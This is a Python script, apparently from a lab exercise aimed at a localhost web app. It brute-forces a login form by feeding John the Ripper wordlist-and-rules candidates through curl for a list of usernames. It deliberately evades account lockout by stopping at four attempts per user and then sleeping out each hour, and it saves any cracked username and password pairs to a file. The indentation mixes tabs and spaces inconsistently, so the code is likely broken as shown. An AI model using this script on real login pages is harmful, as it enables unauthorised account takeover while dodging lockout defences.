import subprocess
import io
import os
import signal
import time

usernameFilePath = "output.txt"
usernameFile     = io.open(usernameFilePath, "r", encoding="utf_8")
usernames        = usernameFile.readlines()
session          = []
wordlist         = "password.lst"
passwordOutput   = io.open("passwordOutput.txt", "w")
johnPath         = "/home/student/JohnTheRipper-unstable-jumbo/run"
errMsg_1         = "Invalid password"
errMsg_2         = "You have exceeded 4 failed logins. Account locked."
foundPassword    = False;

os.chdir(johnPath)

print("Attempting to login...")

while foundPassword == False:
    startTime = time.time()
 
    for username in usernames:
        username = username.rstrip('\n')
        johnCmd  = None

        if username in session:
	    johnCmd  = ["./john", "--restore="+username+""]
        else:
	    print("creating new session: " + username)
	    session.append(username)

	    johnCmd  = ["./john", "--session="+username, "--wordlist="+wordlist, "--stdout", "--rules:Single"]

        johnProc = subprocess.Popen(johnCmd, stdout=subprocess.PIPE)
        counter  = 0

        for password in iter(johnProc.stdout.readline,b''):
            counter   += 1
            password   = password.rstrip('\n')
            curlCmd    = ["curl", "-F", "username="+username, "-F", "password="+password, "localhost:5000/login"]
	    curlOutput = subprocess.check_output(curlCmd, stderr=subprocess.STDOUT)    
	   
            if (curlOutput.find(errMsg_1) == -1 and curlOutput.find(errMsg_2) == -1):
   	        print("Password found:" + password)
                print("username:" + username)
                
                loginInfo     = username + "|" + password + "\n"
                foundPassword = True
	        
                passwordOutput.write(loginInfo.decode('utf8'))
            if counter == 4:
                johnProc.kill()
                break

    endTime  = time.time()
    diffTime = endTime - startTime
    
    if diffTime < 3600:
        sleepTime = 3600 - diffTime
        print("sleeping " + str(sleepTime) + "sec")
        time.sleep(sleepTime)

print("Done")
